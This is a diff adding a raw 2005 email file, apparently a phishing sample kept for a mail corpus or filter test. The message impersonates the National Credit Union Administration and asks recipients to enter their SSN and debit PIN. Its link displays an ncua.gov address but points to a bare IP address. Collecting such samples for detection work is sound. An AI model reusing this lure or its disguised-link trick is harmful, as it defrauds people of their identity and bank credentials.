@@ -1,0 +1,98 @@
+From nobody Sun Jan 25 13:49:55 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 7AA0C2A88C
+ for <user@example.com>; Sun,  3 Jul 2005 05:23:48 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 727CB621C99; Sun,  3 Jul 2005 05:23:48 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 53BB4621C90
+ for <user@example.com>; Sun,  3 Jul 2005 05:23:48 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id FAA17453
+ for user@example.com; Sun, 3 Jul 2005 05:23:48 -0400
+Received: from localhost.localdomain (wpc0296.amenworld.com [62.193.234.45])
+ by mail.example.com with ESMTP id FAA17443
+ for <user@biochemistry.bioc.cwru.edu>; Sun, 3 Jul 2005 05:23:47 -0400
+Received: (qmail 30505 invoked from network); 2 Jul 2005 23:43:56 -0000
+Received: from vds-355367.amen-pro.com (HELO 62.193.234.45) (62.193.212.129)
+ by wpc0296.amenworld.com with SMTP; 2 Jul 2005 23:43:56 -0000
+Received: from 150.160.49.90 by ; Sat, 02 Jul 2005 23:34:48 -0100
+Message-ID: <ATPPFKSBZBPMXBGNFWWW@verizon.net>
+From: "acc-activate@ncua.gov" <confirm@ncua.gov>
+Reply-To: "acc-activate@ncua.gov" <support@ncua.gov>
+To: user@alum.mit.edu, user@alumni.eecs.berkeley.edu,
+ user@australia.edu, user@bentley.edu,
+ user@biochemistry.bioc.cwru.edu, user@biochemistry.bioc.cwru.edu,
+ user@cauchy.math.duke.edu, user@citrus.ucr.edu, user@cs.stanford.edu,
+ user@cs.toronto.edu
+Subject: FCU NOTICE: Important security renewal
+Date: Sat, 02 Jul 2005 20:34:48 -0400
+X-Mailer: Internet Mail Service (5.5.2650.21)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--614563312382616735"
+X-Priority: 1
+X-MSMail-Priority: High
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 19
+
+----614563312382616735
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<head>
+<title>NCUA</title>
+</head>
+
+<body>
+<table width=3D"99%" height=3D"102" 
+border=3D0 cellpadding=3D0 cellspacing=3D0 background=3D"http://www.ncua.g=
+ov/images/prop/bannerStabwide2.jpg">
+  <tr>
+  <td width=3D"18%"><A href=3D"http://www.ncua.gov/index.html"><IMG height=
+=3D98 
+      alt=3D"NCUA Seal" src=3D"http://www.ncua.gov/images/prop/blueseal98.=
+gif" width=3D100 
+      align=3Dleft border=3D0></A></td>
+    <td width=3D"82%" height=3D"102"><H2>National Credit Union Administrat=
+ion</H2></td>
+  </tr>
+</table><table width=3D"553" border=3D"0" cellspacing=3D"0" cellpadding=3D=
+"0">
+  <tr>
+    <td width=3D"553">Dear CU holder account,
+      <p>This notice informs you that your Credit Union bank has joined ou=
+r Federal Credit Union(FCU) network. For both, our and your security, we a=
+re asking you to activate an online account on our database. After activat=
+ion you can login on our system with your SSN and your Credit/Debit PIN nu=
+mber. </p>
+      <p>You must visit the FCU activation page and fill in the form to ac=
+tivate your online account:</p>
+      <p><a href=3D"http://200.60.235.177/.NCUA/update.htm">http://www.ncu=
+a.gov/activate_account.html</a></p>
+      <p>In accordance with NCUA User Agreement, you can use your online a=
+ccount in 24 hours after activation. We thank you for your prompt attentio=
+n to this matter. Please understand that this is a security measure intend=
+ed to help protect you and your account.<br>
+      </p>
+      <p>We apologize for any inconvenience. </p>
+      <p>Sincerely, NCUA Account Review Department <br>
+      </p>
+      <p><hr>
+      <br>
+          Please do not reply to this e-mail. Mail sent to this address ca=
+nnot be answered<br>
+          <br>
+    </p></td>
+  </tr>
+</table>
+
+</body>
+</html>
+
+----614563312382616735--
